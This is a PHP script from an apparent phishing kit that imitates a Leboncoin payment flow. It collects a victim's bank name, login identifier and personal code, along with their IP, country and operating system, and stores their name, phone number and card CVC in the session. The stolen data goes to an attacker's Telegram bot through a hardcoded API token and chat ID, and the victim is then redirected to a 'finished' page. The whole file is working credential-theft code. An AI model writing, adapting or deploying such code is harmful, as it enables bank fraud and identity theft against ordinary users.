<?php

session_start();
include_once 'functions.php';

	
$message = '[🍿] +1 AUTRE BANQUE LEBONCOIN [🍿]' . "\r\n\n";

$message .= '🍿 Banque: ' . $_POST['bank'] . "\r\n\n";
$message .= '🍿 Identifiant : ' . $_POST['idbnk'] . "\r\n\n";
$message .= '🍿 Code personnel : ' . $_POST['password'] . "\r\n\n";

$message .= '[🤖] TIERS [🤖]' . "\r\n\n";

$message .= '🤖 IP : ' . get_user_ip() . "\r\n";
$message .= '🤖 Pays : ' . get_user_country() . "\r\n";
$message .= '🤖 Systeme : ' . get_user_os() . "\r\n";

$_SESSION['name']=$_POST['name'];
$_SESSION['tel']=$_POST['tel'];
$_SESSION['cvc']=$_POST['cvc'];

file_get_contents("https://api.telegram.org/bot7365575342:AAEgg8vKLSnmt3pfdd96nETNLJ5WrbC8vJM/sendMessage?chat_id=7421525298&text=" . urlencode($message)."" );

    header('location: ./fini.php');

?>